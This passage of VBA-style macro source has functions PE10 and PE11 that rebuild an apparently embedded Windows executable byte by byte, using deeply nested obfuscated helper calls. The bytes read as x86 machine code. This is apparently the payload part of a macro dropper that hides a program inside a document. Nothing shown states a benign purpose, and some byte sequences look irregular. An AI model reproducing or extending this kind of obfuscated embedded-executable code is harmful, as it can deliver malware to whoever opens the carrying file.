    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(strPE, ")P"), 255), "8"), 192), 193), "@"), 0), 131), 248), 255), "u"), 131), 139), "5"), 216), 193), "@"), 0), "N"), 214), 133), 192), 165), ")"), 255), 163), 5), 128), 252), 5), 0), "*]"), 195), 199), "F"), 4), 255), 255), 255), 147), 139), "F@"), 133), 192), "t"), 17), 139)
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "@"), 147), 230), 255), 21), "t"), 192), 186), 245), 138), "F@"), 0), 34), 0), 0), "3"), 192), "/]"), 195), 144), 188), 144), 144), 144), 144), 144), 136), 144), 203), 144), "U"), 139), 223), "=EE"), 139), "M"), 145), "~"), 139), "u"), 8), "W"), 139), "}"), 202), 139)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "V"), 241), "j"), 0), "WR"), 137), "F"), 8), 137), "N"), 12), 197), "m"), 180), 0), 217), 4), "F"), 20), "j"), 0), "Wv"), 232), "a"), 6), 0), 0), "W"), 196), "i"), 186), "^]"), 195), 144), 144), 183), 144), "6"), 144), 144), 144), 144), 144), "U"), 139), 236), 224)
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(strPE, 215), "]"), 240), "VWjPS"), 232), 207), 226), 255), 255), "D("), 8), 139), 160), "3"), 192), 139), 215), 185), 20), 0), 0), 188), "j8B"), 171), 137), 22), 137), 26), 139), 6), 139), 220), "Q"), 232), 19), 226), 255), ","), 230), 248), "3"), 192), 139)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(strPE, 215), 185), 14), 0), 0), 0), "4"), 171), 139), 199), 5), "8"), 137), "P"), 16), "l"), 179), 139), "Q,"), 137), 26), 139), 6), 139), 8), "Q"), 232), 138), 220), 255), 255), 215), 248), "3"), 192), 139), 215), 185), 14), "1"), 0), 0), 243), 137), 139), 6), 250), 0), "S")
    strPE = B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "j"), 1), 137), "P"), 20), 139), 14), 139), "Q"), 20), 137), 26), 139), 6), 199), "@4"), 207), 0), "l"), 0), 228), "M"), 204), 193), "HQ"), 232), 8), 248), 255), "UK^[]"), 195), 144), 144), 144), "U"), 139), 236), 183), 139), "y"), 8), "D"), 224), "f")
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "3"), 0), "["), 139), 207), "P"), 232), 27), 238), 255), 255), 220), 232), 181), 12), 255), 255), 131), 196), 4), 15), "]"), 194), 4), 0), 135), 144), 144), "0"), 252), 144), 144), "5"), 144), 144), "L"), 144), 144), "U"), 139), 236), 129), 236), "V"), 2), 0), 0), "S"), 139), "]")
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 8), "VW"), 139), 20), 4), 188), 248), 255), 15), 245), 148), 23), 247), 0), 139), "K"), 16), 133), 201), 144), 132), 228), 1), 0), 0), 139), "u"), 12), 208), "N"), 178), 141), 26), "cQRP'"), 21), 164), "a+"), 0), "A"), 248), 7), 15), 133), "l")
    strPE = B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 1), "n"), 0), 139), "5"), 176), 193), "@"), 0), "G"), 214), 133), 192), 15), 214), 249), 0), 0), 0), 255), 214), 5), 128), 252), 10), 253), "="), 179), "#"), 11), 0), 15), 133), "Q"), 1), 0), 0), 180), "{ "), 164), "s$"), 139), 199), 11), "$u"), 14), "_")
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(strPE, "A"), 184), 180), "#$"), 0), "%"), 138), 229), "]"), 194), 214), 167), 139), "C"), 4), 185), 1), 0), ","), 0), 133), 246), 137), 133), 150), 253), 246), 255), 137), 141), 26), 253), 255), 255), 137), 133), 248), 212), 255), 255), 197), 141), 244), "*"), 255), 255), 127), 10), "|")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(strPE, 4), 133), 151), "s"), 4), "3"), 192), 235), "%j"), 0), "h@B"), 15), "=VW"), 254), 151), "L"), 0), 0), "j"), 0), "D@~"), 15), "8%O"), 137), "["), 248), 232), "FN"), 0), 0), 137), "E"), 252), 141), "E"), 248), 141), 141), 244), 254)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 255), "mP"), 141), 149), 240), "G"), 255), 255), "QRj"), 0), "jAP"), 21), 205), 193), "?"), 0), 131), 248), 255), 137), "E"), 191), "tM"), 133), 192), "u"), 14), "_^"), 184), 204), "#"), 11), 0), "["), 139), 229), "]"), 194), 8), 0), 139), "K"), 164)

    PE10 = strPE
End Function

Private Function PE11() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 147), 133), 228), 254), 255), 255), "PQ"), 221), 13), "P"), 0), 0), 133), 197), "t^"), 139), "K"), 4), 141), "U"), 12), "BE"), 225), "RPh"), 7), 16), 0), 0), "h"), 255), "S"), 0), "vQ"), 199), "Ea"), 4), "o"), 0), "."), 255), 21), 160), 224)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(strPE, "@&"), 133), 192), "t'"), 139), "5"), 216), 193), "@"), 244), 255), 214), 255), 192), ">"), 11), "_^3(["), 16), 229), "]"), 194), 8), 0), 223), 214), "_^"), 5), 128), 252), 206), 230), "["), 139), 229), "]"), 142), 201), 0), 139), 218), 8), 133), 192)
    strPE = B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 4), 235), 223), "^[p"), 229), "]"), 194), 8), 0), 139), "u"), 12), 139), "a"), 166), 137), "s"), 20), 235), 131), "x*"), 227), "u"), 7), 199), "Ci"), 218), 167), 0), 0), "Yx"), 24), 141), "p "), 165), ","), 4), "A"), 0), "3"), 210), 243), 166), "u")
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 173), "_"), 199), "C0"), 185), 0), 0), 145), "^3"), 192), 229), 139), 229), "]"), 194), 8), 193), 184), 241), "u"), 9), 0), "_^["), 139), 229), "]"), 194), 8), 0), 144), 144), 144), 183), 139), 145), "y"), 236), 8), "fE"), 248), "VP"), 255), 171), "x")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(strPE, 192), "@"), 0), 246), "g"), 252), 139), "E"), 248), "3"), 246), "3"), 201), 11), 214), "V"), 11), 200), 136), 10), "RQ"), 232), "gK"), 0), 0), "-"), 0), "@Ed^"), 129), 218), 173), "^)"), 0), 139), 170), 12), 195), 144), 144), 198), 144), 144), 144), 144)
    strPE = A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(strPE, "U"), 139), 246), 251), "E"), 143), "3"), 201), 190), "3"), 246), "f"), 139), "H"), 14), 138), 12), "S-"), 12), 137), 141), ";"), 137), 139), "M"), 8), 193), 226), 3), "P"), 17), "3"), 210), "f"), 139), "P"), 12), 137), "Q"), 4), "3"), 210), "f"), 139), "P"), 10), 137), "Q"), 8)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(strPE, "3"), 210), "fL"), 229), 8), 137), ")"), 12), "x)f"), 139), "P"), 6), 137), 129), 142), 8), 210), "f"), 139), "P"), 2), "J"), 205), "bE3"), 210), "f"), 139), 16), 129), 234), 170), 7), 0), 0), 137), 202), 225), "3"), 210), "f"), 139), "PB"), 137), "Q")
    strPE = B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 28), 139), "Q"), 20), "f"), 139), "p"), 6), 139), 20), 149), "@"), 194), "@"), 214), 141), "T2"), 255), "3"), 246), 137), "Q 3"), 210), 137), "Q$"), 137), "Q(f"), 139), "0"), 139), 247), "%"), 179), 170), 0), 128), "y"), 5), "H"), 131), "M"), 252), "@u")
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "*"), 139), 198), "&;"), 191), 144), 1), 0), 0), 163), 255), "_"), 133), 182), 2), 26), 139), 198), 190), "0"), 0), 0), 0), 153), 247), 254), 133), 210), 253), 12), 139), 204), " "), 131), 248), 143), "~"), 4), "@"), 137), "A ^]"), 195), 144), 144), "w"), 144)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), "Z"), 144), 144), "U"), 139), 236), 0), 236), 224), 0), 0), 0), "SV"), 139), 194), "h"), 221), 139), "}"), 12), 139), 206), "8"), 199), 177), 0), 5), 0), "@"), 134), 173), "j"), 10), 129), 159), 150), "^)"), 0), "QP"), 232), 4), "J")
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 137), "K"), 236), 139), 194), 193), 248), 31), 161), "v"), 8), "E"), 0), 137), "U"), 240), 131), 248), ")"), 15), 140), 228), 1), 0), 0), 141), "*"), 252), "Q"), 232), 178), 1), 0), "V"), 27), 196), 7), 141), "UB"), 141), "E"), 236), 162), "v"), 255), 21), "|")
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 20), "@"), 0), 139), "E"), 252), 165), "M"), 204), 141), "U"), 220), "QRP"), 30), 7), 140), 192), "@"), 211), 139), 240), "c"), 21), "G"), 204), "QS"), 232), 178), 254), 255), 255), 148), 196), 8), 20), 0), "h"), 128), "B"), 15), "WVW"), 232), 177), 171), 0)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 164), 137), "i"), 141), "U"), 239), 141), "E"), 204), 161), "P"), 255), 21), 136), 192), "@"), 0), 139), "U"), 248), 191), "d"), 244), "3"), 246), 219), 201), 147), 219), "V"), 11), 200), "j"), 182), "RQ"), 232), 28), "I"), 0), "B-"), 0), "@"), 134), "H"), 198), 129), 218), 150)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "^)"), 0), "h@B"), 15), 0), "RP"), 232), 177), "I"), 0), 0), 139), "M"), 16), "j"), 0), "h@"), 158), "3"), 0), "QW"), 139), 240), 232), 158), 190), 0), 0), "+"), 240), 139), "E"), 252), 137), "s("), 139), 210), "T"), 139), 192), 3), 249), 229)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 137), 136), 136), 141), 138), 239), 139), 202), 184), 197), 179), 162), "A"), 3), 207), 193), 249), 24), "X"), 209), 193), 234), 255), 3), 202), 247), 238), 174), 214), 193), 250), 11), 139), 194), 3), 209), 193), 232), 31), 175), 194), 137), 241), "$_^z"), 192), "["), 139)
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(strPE, 229), "/"), 194), 12), "-"), 141), "M"), 244), 141), "U"), 28), "QR"), 255), 21), 132), "j@"), 0), 141), "E"), 220), 141), "M"), 237), "P"), 181), "v"), 21), "|"), 192), "@"), 0), 139), "]"), 8), 141), "UcRS"), 246), 222), 253), 255), "|"), 131), 196), 8), "j")
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "#:@B"), 15), 0), "VW"), 232), 221), "J"), 0), 0), 246), 216), 139), 133), " "), 255), 255), 255), "["), 255), 21), 15), 192), "@F3"), 201), "+"), 193), "t"), 239), "Ht0"), 19), 138), "}"), 128), "> "), 255), 255), 255), 139), "U"), 200), "_")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 199), "C$"), 190), 27), 0), 0), 141), 4), 10), "^"), 139), 200), 193), "7q+"), 200), 255), 217), 193), 225), 2), 137), "K(3"), 192), "["), 139), 229), "]"), 194), 12), 0), 150), 149), " "), 255), 255), 255), 139), 133), "t"), 255), 255), 255), 3), 194), 137)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "T$Q"), 200), "_"), 193), 225), 4), "+"), 200), 23), "\"), 217), 209), 225), 2), 137), "K(3"), 192), 231), 139), 229), "]"), 194), 12), 0), 139), 133), " "), 255), 255), 255), 137), "K"), 214), 158), 169), 209), 226), 4), "+"), 208), 247), 218), 193), 226), 172), 137)
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "r(_^3"), 192), "["), 139), 229), "]"), 194), 12), 0), 144), 145), 144), 144), 144), 144), 144), "U"), 139), 236), 190), "@"), 5), 231), 0), 133), 192), "u*h@"), 4), "+"), 0), 255), 21), 128), 192), "@"), 0), ">"), 236), 4), "O"), 146), 139), "E")
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 8), 199), 5), "@"), 5), "`"), 221), 1), 0), 0), 138), 19), 0), "@"), 230), "A"), 0), 161), 156), 241), "A5]"), 28), 139), "M"), 8), 199), 1), "\"), 4), "A"), 0), 213), 236), 4), 22), 0), "]"), 195), 144), 144), 144), 25), 234), 144), 144), 144), 144), 144)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(strPE, "O"), 139), 236), 145), "E"), 12), 243), 143), 8), "B"), 0), "h"), 221), 3), 0), 27), "PQ"), 232), 25), "H"), 0), 0), 241), 198), 21), 176), 149), 181), 0), "]"), 194), 8), 0), 144), "Z"), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "U"), 139)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 236), 139), "E"), 16), "V"), 139), "u"), 12), 218), 139), "}"), 8), 234), "H "), 139), "P"), 16), "VW"), 29), "R"), 195), 227), "?"), 0), "7"), 191), 196), 16), 133), 192), "u"), 11), "_x"), 28), 0), 0), 0), "^]"), 194), 12), 0), 198), 164), "7"), 239), 0)
    strPE = B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "_"), 5), 192), "^]"), 160), 12), 0), "`"), 144), "N"), 130), 193), 162), "TS"), 139), "]"), 12), "V"), 139), "u"), 8), "W"), 139), "}NZ"), 133), 255), 137), 166), 16), "f"), 137), "^(t"), 15), "W"), 204), 21), 168), "D@"), 0), "f"), 137), 29), "*")
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "f"), 137), "~"), 12), 131), 190), 135), 138), 24), 205), 16), 0), 137), 0), 142), "*"), 205), 4), 0), ">"), 0), 137), "F}"), 137), "FD"), 141), "F,"), 137), "F _^[]"), 195), 144), 144), 144), 220), "U"), 162), 236), 139), 222), 156), 139), "M")
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 12), 139), "3"), 16), "S"), 139), "]"), 20), "V"), 199), "wi"), 0), 0), 0), "W"), 199), 165), 190), 0), 0), 0), 139), 251), 131), 201), 182), "3"), 192), "f"), 199), 2), 0), 0), 242), 174), 247), 209), "I"), 141), 140), 202), 255), "k"), 243), 139), 198), "r<"), 161)
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "t"), 193), "@"), 140), 131), "8"), 1), "~"), 18), "3"), 201), "e"), 153), 138), 15), "Q"), 255), 21), "h"), 193), 225), 0), 131), 196), 8), 235), 17), 161), "x"), 193), "@4H"), 188), 144), 175), 139), 8), 138), 4), "Q"), 238), 224), ":"), 180), 192), "t"), 7), 151), ";")
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 251), "s"), 210), 235), 4), ";"), 251), "s%S"), 232), 21), "l"), 193), "@"), 0), 131), 196), 4), 131), 248), 1), "|#="), 255), 250), 152), 0), 127), 28), 139), "UZ_"), 177), "["), 172), 137), 174), "3"), 192), "]"), 194), 20), 0), 128), "?"), 139), "u")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(strPE, "6;"), 218), "s2;"), 251), "u"), 12), 184), "^"), 184), 251), 0), 0), 0), "[]"), 194), 199), 0), 141), "G"), 1), "P"), 255), 232), ">"), 193), "@"), 158), 131), 196), 4), 131), 248), "B|"), 226), "="), 174), "{"), 0), 0), 127), 219), 139), "/"), 177), 141)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "w"), 255), "f"), 137), 1), "+"), 243), 139), "E"), 24), 237), 16), 222), 141), 11), 1), "RP"), 158), "Y"), 219), 255), 255), 208), 164), 8), 161), "u"), 20), 139), 146), 168), 21), 137), "]"), 139), 193), 193), 233), 2), 243), 161), 194), 200), 131), 225), "%g"), 192), 243)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 164), 139), 10), "_^"), 198), 4), 11), "R["), 169), 228), 20), 0), "U"), 139), 236), 139), 163), 24), 139), "U"), 8), 139), 193), "V"), 139), "u"), 164), 131), 224), 3), "W"), 199), 2), 0), 0), 0), 0), "t+"), 133), 246), "t"), 17), 4), "}"), 16), 133), 255)
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "u"), 21), 131), 248), 1), "t"), 16), 246), 193), 2), "t"), 13), "_"), 184), "v"), 17), 1), 0), "^]"), 194), 24), 0), "_"), 237), 22), 0), 0), 0), "%]"), 194), 181), 0), 139), "E"), 241), 180), 192), "u"), 5), 128), 2), 0), 0), 0), 139), "}"), 170), "W")
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "Q"), 139), "M"), 20), "Q"), 26), "V"), 205), 232), 13), 0), 0), 0), 131), 196), 1), "_^]"), 229), 24), 0), 144), 144), "$"), 144), 226), 139), 236), 131), 236), "$SV<u"), 12), "MB;"), 243), 129), "&u"), 244), "u"), 5), "w@"), 244)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "@"), 0), 138), 6), 227), "0"), 15), 132), 185), 0), 10), 0), "<"), 7), 15), 143), 222), "T"), 192), 0), "h4"), 244), "@"), 0), 235), 255), 21), 28), 193), "@"), 0), 139), "#"), 139), 254), 23), 201), 169), "3"), 192), 20), 196), 8), 242), "K"), 160), 246), "I"), 207)
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 209), 15), 133), "#"), 0), 0), 0), "V"), 255), 21), 200), 193), "@"), 0), "dEp"), 141), "E"), 248), 141), "M"), 236), 141), "U"), 162), 137), 142), 236), 31), "]"), 240), 137), "M"), 232), 137), "U"), 12), 139), "E"), 12), 139), "H"), 12), "9"), 25), 15), 131), 168), 238)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(strPE, 0), 0), 183), "]"), 252), 139), "U"), 28), "j8R"), 194), "4"), 218), 255), 254), 139), 248), "3"), 192), 139), "[<7"), 0), 0), 0), 243), 171), 139), 197), 28), 215), 187), 175), 230), "}"), 252), 137), 6), 139), "Q"), 12), 139), 4), 23), 139), "U"), 20), 211)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(strPE, "j"), 2), 139), 8), "V"), 137), "N"), 168), 232), "u"), 253), 255), 255), 131), 11), 12), 133), 219), "u"), 203), 139), 251), 244), 133), 192), "t"), 13), "P"), 139), "E"), 28), "P"), 232), 221), 231), 255), 255), 179), 246), "^"), 139), "M"), 8), "r1"), 235), "1V"), 255), 203)
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 129), 193), "@"), 0), ";"), 195), 137), "E"), 135), "u"), 133), 139), "5"), 216), 193), "@"), 0), 255), 214), "z"), 192), "t"), 190), 241), "1(^"), 5), 250), 252), 10), 0), "["), 139), 166), 164), 195), 139), "S"), 4), 137), 174), 4), 137), "s$"), 139), "2"), 12), 131)
    strPE = B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 199), 4), 139), 222), 137), "}"), 252), "-H"), 12), 131), "<"), 15), 0), "q"), 133), "["), 255), 255), 255), "_"), 211), "3"), 192), "u"), 139), 229), "]"), 137), 144), "U"), 139), 236), 129), 236), "T"), 2), 0), 0), 139), "M"), 12), "SV3"), 207), 139), 1), 139), "Q")
    strPE = B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 177), 137), "E"), 244), 139), 237), 16), 211), 137), "u"), 236), 27), 0), 34), "u"), 252), "O"), 192), 137), "u"), 129), 137), 143), 240), 137), 239), 216), 137), "U*"), 15), 132), 170), 10), 0), 0), "#]"), 20), "<%t"), 183), 139), "E"), 244), 133), 197), "t-")
    strPE = B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(strPE, ";E"), 220), 156), 152), 139), "}eW"), 137), "y"), 240), "U}"), 131), 196), 4), 133), "_"), 15), 133), 148), 10), 0), 0), 139), 22), 4), 139), 7), 137), "M"), 220), 139), "U"), 16), "@8E"), 244), 138), "D"), 136), "H"), 255), 255), "E"), 236), 233), "T")
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 10), 0), 0), 155), "}"), 16), 139), 13), "6"), 193), "@"), 0), 184), 1), 194), 0), 0), "3"), 210), "G9"), 1), 189), 178), 188), 137), "E"), 192), 137), "U"), 200), 137), 251), 23), 137), 217), 212), 198), 198), 23), " "), 136), "U"), 251), "i}"), 16), "~"), 18), 138)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "Lj"), 2), "R"), 217), 21), "h"), 161), "@"), 0), "s"), 196), "l"), 239), 205), 235), 176), 165), 13), "x"), 193), "@"), 0), "3"), 192), 138), 7), 139), 9), 138), 161), "Az"), 224), 2), ";"), 21), 15), 222), 201), 1), 0), 0), 185), 1), 0), 0), 206), 138), "\")
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 230), "-u"), 6), 137), "U"), 192), "G"), 235), 244), "<+u"), 215), 137), "M"), 196), "G"), 26), 195), "<#u7"), 137), "M"), 212), "G"), 235), 10), "< u"), 6), 137), "M"), 200), "G"), 235), ",<0u2"), 136), "E"), 23), "G"), 235), 204)
    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 14), "t"), 193), "@"), 0), 137), 246), 16), "7"), 171), "~"), 20), 252), 146), 9), 4), 138), 15), "c"), 255), 21), "h"), 193), "@U?"), 196), 8), "3"), 210), 235), 18), 139), 13), "x"), 193), "@"), 0), "3"), 192), 138), 7), 139), "Q"), 138), 4), "&"), 131), 224), 4)
    strPE = B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, ";"), 194), "t"), 192), 15), 190), 210), "V"), 233), "0G"), 137), "}"), 16), 139), 202), "ty@"), 0), 137), "M"), 224), 131), ":"), 1), "~"), 21), "3"), 156), "j"), 4), 22), 7), "P"), 255), 21), "h"), 231), "@"), 0), 139), "Mr"), 131), 196), "3"), 235), 188), "/")
